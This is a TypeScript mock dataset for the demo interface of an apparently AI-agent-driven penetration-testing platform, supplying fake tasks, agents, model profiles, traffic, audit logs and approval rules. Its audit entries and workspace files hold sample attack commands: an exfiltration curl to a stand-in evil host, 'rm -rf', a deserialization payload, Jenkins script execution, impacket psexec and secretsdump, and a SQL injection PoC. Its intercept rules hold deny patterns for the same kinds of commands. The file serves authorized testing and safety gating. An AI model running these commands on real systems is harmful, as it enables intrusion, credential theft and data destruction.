// Rich mock dataset for the Vercel demo (NEXT_PUBLIC_MOCK=1). Shapes track the
// current backend contract in lib/api.ts + lib/types.ts. All data is static and
// self-consistent (one company "Acme", a few tasks, findings, exploration graph,
// sessions/activity, traffic, agents, etc.) so every page looks populated.

import type {
  Activity,
  Agent,
  AgentDetail,
  Asset,
  Audit,
  Company,
  Conversation,
  ConvTokenSummary,
  DailyTokenBucket,
  Edge,
  Finding,
  FindingAsset,
  InterceptApprovalRow,
  InterceptAudit,
  InterceptPending,
  InterceptRule,
  LLMPoolStatus,
  LLMProfile,
  LLMTask,
  MCPServer,
  MCPTool,
  MissingSkill,
  PromptVar,
  PromptVersion,
  SessionTokenUsage,
  Settings,
  SkillCall,
  SkillItem,
  Stats,
  Task,
  TaskCategory,
  TaskNode,
  TaskTemplate,
  TokenTotal,
  TokenUsage,
  Tool,
  TrafficDetail,
  TrafficHost,
  TrafficResp,
} from "@/lib/types";

const T = (iso: string) => iso; // readability helper for timestamps

// ── Tasks ──────────────────────────────────────────────────────────────────
export const ACTIVE_TASK = "";

export const tasks: Task[] = [];

export const taskCategories: TaskCategory[] = [
  {
    id: 1,
    name: "外部评估",
    task_count: 2,
    created_at: T("2026-07-18T08:00:00Z"),
    updated_at: T("2026-07-25T08:00:00Z"),
  },
  {
    id: 2,
    name: "API 专项",
    task_count: 2,
    created_at: T("2026-07-19T08:00:00Z"),
    updated_at: T("2026-07-24T08:00:00Z"),
  },
];

export const taskTemplates: TaskTemplate[] = [
  {
    id: 1,
    name: "外部 Web 渗透",
    description: "对目标互联网暴露面开展黑盒渗透测试，覆盖站点、接口和常见管理入口。",
    goal: "识别并验证可造成未授权访问、敏感数据泄露或服务器失陷的安全问题。",
    created_at: T("2026-07-20T08:00:00Z"),
    updated_at: T("2026-07-25T08:00:00Z"),
  },
  {
    id: 2,
    name: "API 越权专项",
    description: "围绕目标 API 的身份认证、对象级授权和角色边界开展专项测试。",
    goal: "确认是否存在 IDOR、水平越权、垂直越权及批量数据访问风险。",
    created_at: T("2026-07-19T08:00:00Z"),
    updated_at: T("2026-07-24T08:00:00Z"),
  },
];

export const getTask = (id: string) => tasks.find((t) => t.id === id);

const grandTotal: TokenTotal = tasks.reduce(
  (a, t) => ({
    input_tokens: a.input_tokens + (t.tokens?.input_tokens ?? 0),
    output_tokens: a.output_tokens + (t.tokens?.output_tokens ?? 0),
    cache_read_tokens: a.cache_read_tokens + (t.tokens?.cache_read_tokens ?? 0),
    cache_write_tokens: a.cache_write_tokens + (t.tokens?.cache_write_tokens ?? 0),
  }),
  { input_tokens: 0, output_tokens: 0, cache_read_tokens: 0, cache_write_tokens: 0 },
);

// ── Stats ──────────────────────────────────────────────────────────────────
export function stats(
  taskId?: string,
  state: { tasks?: readonly Task[]; findings?: readonly Finding[]; activeTask?: string } = {},
): Stats & { active_task?: unknown } {
  const taskList = state.tasks ?? tasks;
  const findingList = state.findings ?? findings;
  const base: Stats = {
    assets: assets.length,
    engine_mode: "idle",
    llm_configured: true,
    roe_enabled: true,
    findings_confirmed: findingList.filter((f) => f.severity !== "low").length,
  };
  const selectedTaskID = taskId ?? state.activeTask ?? ACTIVE_TASK;
  const t = taskList.find((item) => item.id === selectedTaskID);
  if (!t) return base;
  return {
    ...base,
    engine_mode: t.engine_mode ?? "idle",
    findings_confirmed: findingList.filter((f) => f.task_id === t.id).length,
    active_task: {
      id: t.id,
      in_flight: t.in_flight,
      goals_total: t.goals_total,
      goals_met: t.goals_met,
      engine_mode: t.engine_mode,
      paused: t.paused,
    },
  };
}

// ── Company + Assets (new unified model) ─────────────────────────────────────
export const companies: Company[] = [];

export const assets: Asset[] = [];

export const assetCounts: Record<string, number> = assets.reduce<Record<string, number>>((m, a) => {
  m[a.type] = (m[a.type] ?? 0) + 1;
  return m;
}, {});

// assetRef 把资产 id 变成 finding 上挂的资产引用(label 与后端 coverageNodeLabel
// 的取值顺序一致:URL > 域名 > IP > 应用名)。「按资产」视图的树就是靠这些引用
// 把发现挂到资产上的。
function assetRef(id: number): FindingAsset {
  const asset = assets.find((candidate) => candidate.id === id);
  if (!asset) {
    return { id: String(id), type: "unknown", label: `资产 #${id}` };
  }
  return {
    id: String(id),
    type: asset.type,
    label: asset.url || asset.domain || asset.ip || asset.app_name || String(id),
  };
}

// ── Findings ─────────────────────────────────────────────────────────────────
export const findings: Finding[] = [];

// ── Exploration graph (active task) ──────────────────────────────────────────
// 现行模型：根是 fact/state=origin（渲染为「起点」）；payload 为 JSON 字符串，
// goal 取 text、其余取 summary。结构：根→目标(spawns)→意图(spawns)→事实/漏洞(yields)，
// 漏洞→目标(proves)，提示→意图(derived_from)。
const P = (o: Record<string, string>) => JSON.stringify(o);

export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = { nodes: [], edges: [] };

export const intents: TaskNode[] = explorationGraph.nodes.filter((n) => n.type === "intent");
export const frontier: TaskNode[] = explorationGraph.nodes.filter(
  (n) => n.type === "intent" && (n.state === "open" || n.state === "running"),
);

// ── Activity（执行过程）─────────────────────────────────────────────────────
// 会话由 sessions-tab 从「意图」派生（session.id = intent.id），transcript = 匹配
// intent_id 的活动流。planner=worker "planner"、主 agent=worker "mainagent"。
// 每个 worker 会话含完整工具执行链（tool_use → tool_result → …→ result）。
export const activity: Activity[] = [];

export function activityForTask(): Activity[] {
  return activity;
}

// ── Token stats ──────────────────────────────────────────────────────────────
export const tokenWorkers: TokenUsage[] = [];

// Mirrors TokenStatsBySession: completed usage is keyed by the stable UI session
// (main | plan | intent:<id>) instead of the reusable work#N executor name.
export const tokenSessions: SessionTokenUsage[] = (() => {
  const totals = new Map<string, SessionTokenUsage>();
  for (const item of activity) {
    if (item.kind !== "result") continue;
    let session = "";
    if (item.worker === "mainagent") session = "main";
    else if (item.worker === "planner") session = "plan";
    else if (item.intent_id) session = `intent:${item.intent_id}`;
    if (!session) continue;
    const current = totals.get(session) ?? {
      session,
      input_tokens: 0,
      output_tokens: 0,
      cache_read_tokens: 0,
      cache_write_tokens: 0,
    };
    current.input_tokens += item.input_tokens ?? 0;
    current.output_tokens += item.output_tokens ?? 0;
    current.cache_read_tokens += item.cache_read_tokens ?? 0;
    current.cache_write_tokens += item.cache_write_tokens ?? 0;
    totals.set(session, current);
  }
  return [...totals.values()];
})();

export const tokenTotal: TokenTotal = grandTotal;

export const dailyTokens: DailyTokenBucket[] = Array.from({ length: 30 }, (_, i) => {
  const d = new Date("2026-07-26T00:00:00Z");
  d.setUTCDate(d.getUTCDate() - (29 - i));
  const wave = 40000 + Math.round(30000 * Math.abs(Math.sin(i / 3)));
  return {
    date: d.toISOString().slice(0, 10),
    input_tokens: wave,
    output_tokens: Math.round(wave * 0.08),
    cache_read_tokens: Math.round(wave * 0.7),
    cache_write_tokens: Math.round(wave * 0.12),
  };
});

export const convTokens: ConvTokenSummary[] = [
  {
    llm_profile_id: 1,
    created_at: T("2026-07-25T10:00:00Z"),
    input_tokens: 42000,
    output_tokens: 3800,
    cache_read_tokens: 26000,
    cache_write_tokens: 5200,
  },
  {
    llm_profile_id: 2,
    created_at: T("2026-07-24T16:00:00Z"),
    input_tokens: 18000,
    output_tokens: 1600,
    cache_read_tokens: 9000,
    cache_write_tokens: 2100,
  },
];

// ── Traffic ──────────────────────────────────────────────────────────────────
const exchanges: readonly (readonly [string, string, string, string, number, string, number])[] = [] as const;

export const traffic: TrafficResp = {
  enabled: true,
  proxy: ":8788",
  count: exchanges.length,
  total: exchanges.length,
  page: 0,
  size: 100,
  exchanges: exchanges.map(([id, host, method, url, status, ct, len], i) => ({
    id,
    host,
    method,
    url,
    status,
    content_type: ct,
    resp_len: len,
    ts: T(`2026-07-26T0${1 + (i % 3)}:${String(10 + i).padStart(2, "0")}:00Z`),
  })),
};

// Distinct hosts with counts, derived from the exchanges above (target picker).
const hostCounts: Record<string, number> = {};
for (const [, host] of exchanges) hostCounts[host] = (hostCounts[host] ?? 0) + 1;
export const trafficHosts: TrafficHost[] = Object.entries(hostCounts).map(([host, count]) => ({ host, count }));

export const trafficDetail: TrafficDetail = {
  req: `GET /v1/orders?id=1002 HTTP/1.1
Host: api.acme.com
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
User-Agent: ARTEX-worker/1.0
Accept: application/json

`,
  resp: `HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 655

{
  "order_id": 1002,
  "user_id": 77,
  "amount": 1299.00,
  "address": "北京市朝阳区 ****",
  "phone": "138****6021",
  "items": [{ "sku": "A-100", "qty": 1 }]
}`,
};

// ── Security / Audit ─────────────────────────────────────────────────────────
export const audit: Audit = {
  attributions: { allow: 312, block: 9 },
  entries: [
    {
      ts: T("2026-07-26T03:33:00Z"),
      tool: "bash",
      action: "allow",
      command: "curl -s -d 'username=admin...' https://admin.acme.com/login",
    },
    {
      ts: T("2026-07-26T03:57:00Z"),
      tool: "bash",
      action: "allow",
      command: "curl -s -b 'session=...' https://admin.acme.com/api/users",
    },
    {
      ts: T("2026-07-26T02:10:00Z"),
      tool: "bash",
      action: "block",
      reason: "目标越界：out.evil.example 不在 scope 内",
      command: "curl https://out.evil.example/exfil",
    },
    {
      ts: T("2026-07-25T22:03:00Z"),
      tool: "bash",
      action: "allow",
      command: "sqlmap -u 'https://www.acme.com/search?q=1' --batch",
    },
    {
      ts: T("2026-07-25T21:00:00Z"),
      tool: "bash",
      action: "block",
      reason: "破坏性命令门控：rm -rf 被拒绝",
      command: "rm -rf /var/www",
    },
    {
      ts: T("2026-07-25T20:30:00Z"),
      tool: "bash",
      action: "allow",
      command: "git-dumper https://www.acme.com/.git/ /tmp/acme",
    },
    {
      ts: T("2026-07-25T15:20:00Z"),
      tool: "bash",
      action: "allow",
      command:
        "curl -s -H 'Content-Type: application/json' -d '{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"...}' https://shop.acme.com/api/import",
    },
    {
      ts: T("2026-07-25T21:40:00Z"),
      tool: "bash",
      action: "allow",
      command: "curl -s -d 'script=println+\"whoami\"...' http://10.10.10.20:8080/scriptText",
    },
    {
      ts: T("2026-07-26T00:00:00Z"),
      tool: "bash",
      action: "allow",
      command: "impacket-psexec acme.local/svc_deploy@10.10.10.10",
    },
    {
      ts: T("2026-07-26T00:05:00Z"),
      tool: "bash",
      action: "block",
      reason: "数据外泄门控：secretsdump 需人工审批",
      command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc",
    },
    {
      ts: T("2026-07-26T00:06:00Z"),
      tool: "bash",
      action: "allow",
      command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc  # 已审批放行",
    },
  ],
};

// ── LLM profiles ─────────────────────────────────────────────────────────────
export const llmProfiles: LLMProfile[] = [
  {
    id: "1",
    name: "Claude Opus 4.8",
    format: "anthropic",
    model: "claude-opus-4-8",
    api_key_hint: "…a3f2",
    rate_per_second: 0,
    rate_per_minute: 0,
    context_window_k: 1000,
    thinking_type: "enabled",
    reasoning_effort: "high",
    is_default: true,
    priority: 0,
    pool_exclude: false,
    // anthropic 的字段名固定，故 max_tokens_field 恒为空。
    max_tokens: 0,
    max_tokens_field: "",
  },
  {
    id: "2",
    name: "DeepSeek V4",
    format: "openai",
    base_url: "https://api.deepseek.com",
    model: "deepseek-v4-flash",
    api_key_hint: "…9c11",
    rate_per_second: 0,
    rate_per_minute: 60,
    context_window_k: 128,
    thinking_type: "",
    reasoning_effort: "",
    is_default: false,
    priority: 10,
    pool_exclude: false,
    // openai 格式 + 推理模型：上限走 max_completion_tokens。
    max_tokens: 8192,
    max_tokens_field: "max_completion_tokens",
  },
];

export const llmConfig = {
  configured: true,
  provider: "anthropic",
  model: "claude-opus-4-8",
  base_url: "",
  proxy: "",
  key_set: true,
  rate_per_second: 0,
  rate_per_minute: 0,
  context_window_k: 1000,
  thinking_type: "enabled",
  reasoning_effort: "high",
};

// ── Agents ───────────────────────────────────────────────────────────────────
export const agents: Agent[] = [
  {
    id: "1001",
    key: "retester",
    name: "漏洞复测",
    role: "assistant",
    builtin: false,
    enabled: true,
    description: "从漏洞详情手动启动，保存独立复测结论",
    max_turns: 0,
    mcp_count: 0,
    skill_count: 0,
    tool_count: 2,
  },
  {
    id: "1",
    key: "goals",
    name: "目标拆解器",
    role: "goals",
    builtin: true,
    enabled: true,
    description: "把任务目标拆成可探索的子目标",
    max_turns: 8,
    mcp_count: 0,
    skill_count: 1,
    tool_count: 3,
  },
  {
    id: "2",
    key: "planner",
    name: "规划者",
    role: "planner",
    builtin: true,
    enabled: true,
    description: "读探索路线、判断目标达成、生成意图",
    max_turns: 0,
    mcp_count: 1,
    skill_count: 2,
    tool_count: 9,
  },
  {
    id: "3",
    key: "mainagent",
    name: "主 Agent",
    role: "mainagent",
    builtin: true,
    enabled: true,
    description: "人在环路对话，注入 hint / 高优意图",
    max_turns: 0,
    web_search: true,
    mcp_count: 2,
    skill_count: 3,
    tool_count: 11,
  },
  {
    id: "4",
    key: "worker",
    name: "Work Agent",
    role: "worker",
    builtin: true,
    enabled: true,
    description: "claim 意图 → 跑 Kali 工具 → 图写回",
    max_turns: 40,
    run_seconds: 1800,
    web_search: false,
    interactive_shell: true,
    mcp_count: 2,
    skill_count: 3,
    tool_count: 14,
  },
  {
    id: "5",
    key: "recon-bot",
    name: "侦察机器人（自定义）",
    role: "custom",
    builtin: false,
    enabled: true,
    description: "定时对新资产做被动侦察",
    max_turns: 12,
    mcp_count: 1,
    skill_count: 1,
    tool_count: 4,
  },
];

const promptVars: PromptVar[] = [
  { name: "Goal", description: "当前任务目标", example: "拿到 acme.com 后台管理权限", source: "runtime" },
  { name: "AssetSummary", description: "资产图概览", example: "6 子域 / 3 IP / 4 应用 / 4 端点", source: "distilled" },
  { name: "RouteHint", description: "探索路线提示", example: "优先后台与 API 越权面", source: "exploration" },
];

const promptVersions: PromptVersion[] = [
  { version: 3, ts: T("2026-07-25T10:00:00Z"), note: "加强越权探测引导", template_text: "你是 ARTEX 的规划者……" },
  { version: 2, ts: T("2026-07-20T10:00:00Z"), note: "初版微调", template_text: "你是 ARTEX 的规划者(v2)……" },
];

export function agentDetail(key: string): AgentDetail {
  const a = agents.find((x) => x.key === key) ?? agents[1];
  return {
    agent: a,
    prompt: `你是 ARTEX 的「${a.name}」。\n目标：{{.Goal}}\n资产概览：{{.AssetSummary}}\n路线提示：{{.RouteHint}}\n请基于以上信息推进探索，并通过工具把结果写回图。`,
    variables: promptVars,
    versions: promptVersions,
    visibility: { mcp: [1, 2], skill: ["api-recon", "playwright-cli"] },
    wrapup_prompt: "",
    wrapup_default: "时间/步数将尽，请总结已确认发现并标记意图终态。",
    wrapup_max_turns: 0,
    wrapup_max_turns_default: 3,
    task_timeout_wrapup_supported: a.key === "worker" || a.key === "planner",
    task_timeout_wrapup_default: "任务超时，请立即收尾并落库当前结论。",
    task_timeout_wrapup_max_turns_default: 2,
  };
}

// ── MCP ──────────────────────────────────────────────────────────────────────
export const mcpServers: MCPServer[] = [
  {
    id: 1,
    name: "shodan",
    transport: "http",
    url: "https://mcp.shodan.io/sse",
    args: [],
    env: {},
    enabled: true,
    tools: ["host_info", "search", "dns_resolve"],
  },
  {
    id: 2,
    name: "playwright",
    transport: "stdio",
    command: "npx",
    args: ["-y", "@playwright/mcp"],
    env: {},
    enabled: true,
    tools: ["browser_navigate", "browser_click", "browser_snapshot"],
  },
];

export const mcpToolsById: Record<number, MCPTool[]> = {
  1: [
    { name: "host_info", description: "查询某 IP 的 Shodan 主机信息" },
    { name: "search", description: "Shodan 搜索" },
    { name: "dns_resolve", description: "DNS 解析" },
  ],
  2: [
    { name: "browser_navigate", description: "浏览器打开 URL" },
    { name: "browser_click", description: "点击元素" },
    { name: "browser_snapshot", description: "抓取可访问性快照" },
  ],
};

// ── Skills ───────────────────────────────────────────────────────────────────
export const skills: SkillItem[] = [
  {
    name: "api-recon",
    description: "对 REST/GraphQL API 做侦察与越权面枚举；发现新 API 端点时使用。",
    license: "MIT",
    mcps: [],
    files: ["SKILL.md", "scripts/enum.py"],
    calls: 24,
    tasks: 6,
    usage_agents: ["worker", "planner"],
    last_used: "2026-08-20T09:12:00Z",
  },
  {
    name: "playwright-cli",
    description: "用 Playwright 驱动浏览器做动态爬取与截图；需要渲染 JS 站点时使用。",
    mcps: ["playwright"],
    files: ["SKILL.md"],
    calls: 7,
    tasks: 3,
    usage_agents: ["worker"],
    last_used: "2026-08-19T21:40:00Z",
  },
  {
    name: "scopesentry",
    description: "从 ScopeSentry 拉取资产并归并到公司范围；批量导入资产时使用。",
    files: ["SKILL.md", "assets/mapping.md"],
    calls: 0,
    tasks: 0,
    usage_agents: [],
  },
];

export const skillCalls: SkillCall[] = [
  { ts: "2026-08-20T09:12:00Z", agent_key: "worker", task_id: 42, session_id: "", args_len: 128 },
  { ts: "2026-08-20T08:03:00Z", agent_key: "planner", task_id: 42, session_id: "", args_len: 0 },
  { ts: "2026-08-19T17:55:00Z", agent_key: "worker", task_id: 37, session_id: "", args_len: 64 },
];

export const missingSkills: MissingSkill[] = [
  { skill: "jwt-forge", calls: 3, agents: ["worker"], last_used: "2026-08-20T07:20:00Z" },
];

// ── Tools ────────────────────────────────────────────────────────────────────
export const tools: Tool[] = [
  {
    key: "bash",
    system: true,
    description: "在 Kali 环境执行 shell 命令（受 scope/破坏性门控）",
    schema: { type: "object", properties: { command: { type: "string" } }, required: ["command"] },
    agents: ["worker", "mainagent"],
    enabled: true,
    kind: "builtin",
    calls: 1842,
  },
  {
    key: "report_finding",
    system: true,
    description: "上报一个安全发现并连到相关节点",
    schema: {
      type: "object",
      properties: {
        vulnclass: { type: "string" },
        severity: { type: "string" },
        summary: { type: "string" },
        evidence: { type: "string" },
      },
      required: ["vulnclass", "severity", "summary"],
    },
    agents: ["worker"],
    enabled: true,
    kind: "builtin",
    calls: 96,
  },
  {
    key: "upsert_asset",
    system: true,
    description: "写入/更新资产节点",
    schema: { type: "object", properties: { type: { type: "string" }, value: { type: "string" } } },
    agents: ["worker"],
    enabled: true,
    kind: "builtin",
    calls: 417,
  },
  {
    key: "list_goals",
    system: true,
    description: "列出当前任务的目标与达成状态",
    schema: { type: "object", properties: {} },
    agents: ["planner"],
    enabled: true,
    kind: "builtin",
    calls: 238,
  },
  {
    key: "nuclei_scan",
    system: false,
    description: "自定义：用 nuclei 跑指定模板",
    schema: {
      type: "object",
      properties: { target: { type: "string" }, template: { type: "string" } },
      required: ["target"],
    },
    agents: ["worker"],
    enabled: true,
    kind: "command",
    exec: { command: "nuclei", args: ["-u", "{{target}}"] },
    calls: 31,
  },
];

// ── Settings ─────────────────────────────────────────────────────────────────
export const settings: Settings = {
  traffic_capture: true,
  agent_traffic_binding: false,
  llm_record: false,
  web_search_enabled: true,
  web_search_backend: "ddgs",
  brave_key_set: false,
  tavily_key_set: true,
  web_search_proxy: "",
  global_proxy: "",
  python_interpreter: "/usr/bin/python3",
  workers: 3,
  llm_pool_enabled: true,
  llm_pool_bind_fallback: false,
  noa_compaction: false,
};

// ── LLM 轮询（故障转移）──────────────────────────────────────────────────────
// demo：激活配置正常，备用配置刚因余额不足熔断，正在冷却。
export const llmPool: LLMPoolStatus = {
  enabled: true,
  bind_fallback: false,
  chain: [
    {
      profile_id: "1",
      name: "Claude Opus 4.8",
      model: "claude-opus-4-8",
      format: "anthropic",
      priority: 0,
      active: true,
      excluded: false,
      state: "ok",
      fails: 0,
      trips: 0,
      cooldown_secs: 0,
    },
    {
      profile_id: "2",
      name: "DeepSeek V4",
      model: "deepseek-v4-flash",
      format: "openai",
      priority: 10,
      active: false,
      excluded: false,
      state: "tripped",
      fails: 0,
      trips: 1,
      cooldown_secs: 42,
      last_error: "openai: status 402: insufficient balance",
      last_at: T("2026-07-26T00:10:00Z"),
    },
  ],
};

// ── Intercept ────────────────────────────────────────────────────────────────
export const interceptRules: InterceptRule[] = [
  {
    id: 1,
    name: "破坏性命令需审批",
    enabled: true,
    priority: 10,
    match_target: "tool_input",
    match_type: "regex",
    pattern: "rm\\s+-rf|mkfs|dd\\s+if=",
    action: "ask",
    message: "检测到破坏性命令，需人工审批",
    timeout_enabled: true,
    timeout_seconds: 120,
    timeout_action: "deny",
    created_at: T("2026-07-20T10:00:00Z"),
    updated_at: T("2026-07-20T10:00:00Z"),
  },
  {
    id: 2,
    name: "外发流量直接拒绝",
    enabled: true,
    priority: 20,
    match_target: "tool_input",
    match_type: "string",
    pattern: "exfil",
    action: "deny",
    message: "疑似外发数据",
    timeout_enabled: false,
    timeout_seconds: 0,
    timeout_action: "deny",
    created_at: T("2026-07-21T10:00:00Z"),
    updated_at: T("2026-07-21T10:00:00Z"),
  },
];

export const interceptPending: InterceptPending[] = [];

export const interceptHistory: InterceptApprovalRow[] = [];

// Approval detail fixtures use harmless report-writing examples.
interceptHistory.unshift({
  id: 94,
  task_id: "t-acme-web",
  agent_name: "work#1",
  tool_name: "Write",
  tool_input: { path: "reports/summary.md", content: "# 检查摘要\n\n本轮验证已完成，整理已有证据与后续建议。" },
  status: "allowed",
  decision_source: "model",
  reason: "[模型] 将已有检查结论写入本地报告，不修改业务数据。",
  created_at: T("2026-07-26T08:00:00Z"),
  decided_at: T("2026-07-26T08:00:02Z"),
  conv_title: "",
  conv_agent_key: "",
  rule_name: "",
});

export const interceptDetails: Record<number, InterceptAudit> = {};

// ── Conversations (chat) ─────────────────────────────────────────────────────
export const conversations: Conversation[] = [];

export const conversationMessages: Record<number, Activity[]> = {};

// ── 资产测试覆盖度（/tasks/{id}/coverage）──
export const coverage = {
  enabled: true,
  scope_rows: 4,
  denominator: 26,
  tested: 11,
  pct: 11 / 26,
  by_type: [
    { type: "subdomain", total: 6, tested: 4 },
    { type: "service", total: 9, tested: 4 },
    { type: "endpoint", total: 8, tested: 2 },
    { type: "ip", total: 3, tested: 1 },
  ],
};

// ── 资产覆盖图（/tasks/{id}/coverage-graph）──
export const coverageGraph = {
  nodes: [
    { key: "c:1", kind: "company", label: "Acme Corp", tested: false, in_scope: false, company_id: 1 },
    {
      key: "a:1",
      kind: "root_domain",
      label: "acme.com",
      tested: false,
      in_scope: false,
      asset_id: 1,
      domain: "acme.com",
      company_id: 1,
    },
    {
      key: "a:2",
      kind: "subdomain",
      label: "www.acme.com",
      tested: true,
      in_scope: true,
      asset_id: 2,
      domain: "www.acme.com",
      root_domain: "acme.com",
    },
    {
      key: "a:3",
      kind: "subdomain",
      label: "api.acme.com",
      tested: true,
      in_scope: true,
      asset_id: 3,
      domain: "api.acme.com",
      root_domain: "acme.com",
    },
    {
      key: "a:4",
      kind: "subdomain",
      label: "admin.acme.com",
      tested: false,
      in_scope: true,
      asset_id: 4,
      domain: "admin.acme.com",
      root_domain: "acme.com",
    },
    {
      key: "a:5",
      kind: "service",
      label: "www.acme.com",
      tested: true,
      in_scope: true,
      asset_id: 5,
      domain: "www.acme.com",
      url: "https://www.acme.com",
      port: 443,
      page_title: "Acme 首页",
      status_code: 200,
    },
    {
      key: "a:6",
      kind: "endpoint",
      label: "https://www.acme.com/search",
      tested: true,
      in_scope: true,
      asset_id: 6,
      url: "https://www.acme.com/search?q=",
      domain: "www.acme.com",
    },
    {
      key: "a:7",
      kind: "service",
      label: "api.acme.com",
      tested: true,
      in_scope: true,
      asset_id: 7,
      domain: "api.acme.com",
      url: "https://api.acme.com",
      port: 443,
      page_title: "API Gateway",
      status_code: 401,
    },
    {
      key: "a:8",
      kind: "endpoint",
      label: "https://api.acme.com/v1/orders",
      tested: false,
      in_scope: true,
      asset_id: 8,
      url: "https://api.acme.com/v1/orders?id=",
      domain: "api.acme.com",
    },
    {
      key: "a:9",
      kind: "service",
      label: "admin.acme.com",
      tested: false,
      in_scope: true,
      asset_id: 9,
      domain: "admin.acme.com",
      url: "https://admin.acme.com",
      port: 443,
      page_title: "后台登录",
      status_code: 200,
    },
    {
      key: "a:10",
      kind: "ip",
      label: "203.0.113.10",
      tested: true,
      in_scope: true,
      asset_id: 10,
      ip: "203.0.113.10",
      company_id: 1,
    },
  ],
  edges: [
    { src: "a:1", dst: "c:1" },
    { src: "a:2", dst: "a:1" },
    { src: "a:3", dst: "a:1" },
    { src: "a:4", dst: "a:1" },
    { src: "a:5", dst: "a:2" },
    { src: "a:6", dst: "a:5" },
    { src: "a:7", dst: "a:3" },
    { src: "a:8", dst: "a:7" },
    { src: "a:9", dst: "a:4" },
    { src: "a:10", dst: "c:1" },
  ],
};

// ── 资产在本任务关联的意图/事实/发现（/tasks/{id}/asset-refs）──
// 播报板 demo:探索节点 → 其锚定资产。真实后端读 exploration_anchors,mock 里静态给几条。
const NODE_ASSETS: Record<string, number[]> = {
  fi1: [3],
  fi2: [2, 4],
  fi3: [5],
  fiRce: [4],
  fiPriv: [19],
  fiJenkins: [21],
  i1: [2],
  i7: [4],
};

export function nodeAssetsFor(nodeId: string): FindingAsset[] {
  return (NODE_ASSETS[nodeId] ?? []).flatMap((id) => {
    const asset = assets.find((candidate) => candidate.id === id);
    return asset ? [assetRef(id)] : [];
  });
}

export function assetRefsFor(_assetId: number) {
  return {
    intents: [
      { id: 12, kind: "intent", state: "done", summary: "对 www.acme.com 搜索接口做 SQL 注入探测" },
      { id: 18, kind: "intent", state: "running", summary: "枚举 api.acme.com 的对象越权 (IDOR)" },
    ],
    facts: [{ id: 34, kind: "fact", state: "confirmed", summary: "search?q= 参数可注入，报错回显 MySQL 语法错误" }],
    findings: [{ id: 41, kind: "finding", state: "confirmed", summary: "[高] SQL 注入 www.acme.com/search?q=" }],
  };
}

// ── 工作空间文件管理器（/workspace/*，demo：静态示例树）──
const WS_TREE: Record<string, { name: string; dir: boolean; size: number; content?: string }[]> = {
  "": [
    { name: "t-001", dir: true, size: 0 },
    { name: "transcripts", dir: true, size: 0 },
    {
      name: "notes.md",
      dir: false,
      size: 96,
      content: "# 工作区笔记\n\n（demo）这是工作空间根目录下的示例文件，可在线编辑并保存。\n",
    },
  ],
  "t-001": [
    { name: "i12", dir: true, size: 0 },
    { name: "recon.txt", dir: false, size: 64, content: "acme.com\nwww.acme.com\napi.acme.com\nadmin.acme.com\n" },
  ],
  "t-001/i12": [
    {
      name: "exploit.py",
      dir: false,
      size: 220,
      content:
        "#!/usr/bin/env python3\n# (demo) SQLi PoC — www.acme.com/search?q=\nimport requests\n\nr = requests.get('https://www.acme.com/search', params={'q': \"1' OR '1'='1\"})\nprint(r.status_code, len(r.text))\n",
    },
    {
      name: "response.html",
      dir: false,
      size: 180,
      content: "<!-- (demo) 抓到的响应体片段 -->\n<html><body>MySQL error near ''1'='1'</body></html>\n",
    },
  ],
  transcripts: [
    { name: "exp1-worker-i12.jsonl", dir: false, size: 512, content: "（demo）原始 LLM 对话记录示例，此处省略。" },
  ],
};

const wsClean = (p: string) => p.replace(/^\/+|\/+$/g, "");

export function workspaceList(path: string) {
  const key = wsClean(path);
  const items = WS_TREE[key] ?? [];
  const now = Date.parse("2026-08-09T03:00:00Z");
  return {
    path: key,
    entries: items.map((it, i) => ({
      name: it.name,
      path: key ? `${key}/${it.name}` : it.name,
      dir: it.dir,
      size: it.size,
      mtime: now - i * 3_600_000,
    })),
  };
}

export function workspaceRead(path: string) {
  const key = wsClean(path);
  const slash = key.lastIndexOf("/");
  const parent = slash >= 0 ? key.slice(0, slash) : "";
  const name = slash >= 0 ? key.slice(slash + 1) : key;
  const f = (WS_TREE[parent] ?? []).find((x) => x.name === name && !x.dir);
  return { path: key, size: f?.size ?? 0, binary: false, content: f?.content ?? "" };
}

// ── 工具执行历史（/commands）──
export const commandRecords: any[] = [];

// ── LLM 录制（/llm/records、/llm/records/{id}）──
export const llmRecords: any[] = [];

// Distinct tasks with counts, derived from llmRecords above (task picker).
const llmTaskCounts: Record<string, number> = {};
for (const r of llmRecords) if (r.task_id) llmTaskCounts[r.task_id] = (llmTaskCounts[r.task_id] ?? 0) + 1;
export const llmTasks: LLMTask[] = Object.entries(llmTaskCounts).map(([task_id, count]) => ({ task_id, count }));

export function llmRecordDetail(id: number, records = llmRecords) {
  const item = records.find((r) => r.id === id) ?? records[0];
  return {
    ...item,
    request_body: JSON.stringify(
      {
        model: item.model,
        system: "你是一个授权渗透测试系统的「执行者」…（省略）",
        messages: [{ role: "user", content: "开始执行 system 提示里的这条意图：只做它、只产生事实、做完即停。" }],
        tools: ["bash", "insert_assets", "record_fact", "report_finding"],
      },
      null,
      2,
    ),
    response_body: JSON.stringify(
      {
        stop_reason: item.status === "error" ? "error" : "tool_use",
        content: [
          { type: "text", text: "对 search?q= 做注入探测，先用报错型 payload 验证。" },
          { type: "tool_use", name: "bash", input: { command: "curl -s 'https://www.acme.com/search?q=1%27'" } },
        ],
        usage: { input_tokens: item.input_tokens, output_tokens: item.output_tokens },
      },
      null,
      2,
    ),
    // HTTP 原文：请求含被归一化视图丢弃的完整工具 schema，响应为原始 SSE 帧。
    raw_request: JSON.stringify({
      model: item.model,
      max_tokens: 8192,
      stream: true,
      system: [
        { type: "text", text: "你是一个授权渗透测试系统的「执行者」…（省略）", cache_control: { type: "ephemeral" } },
      ],
      messages: [{ role: "user", content: "开始执行 system 提示里的这条意图：只做它、只产生事实、做完即停。" }],
      tools: [
        {
          name: "bash",
          description: "在目标环境中执行一条 shell 命令并返回其输出。",
          input_schema: { type: "object", properties: { command: { type: "string" } }, required: ["command"] },
        },
      ],
      thinking: { type: "enabled" },
    }),
    raw_response: [
      `event: message_start`,
      `data: {"type":"message_start","message":{"id":"msg_01mock","model":"${item.model}","usage":{"input_tokens":${item.input_tokens},"output_tokens":1}}}`,
      ``,
      `event: content_block_delta`,
      `data: {"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"对 search?q= 做注入探测。"}}`,
      ``,
      `event: content_block_start`,
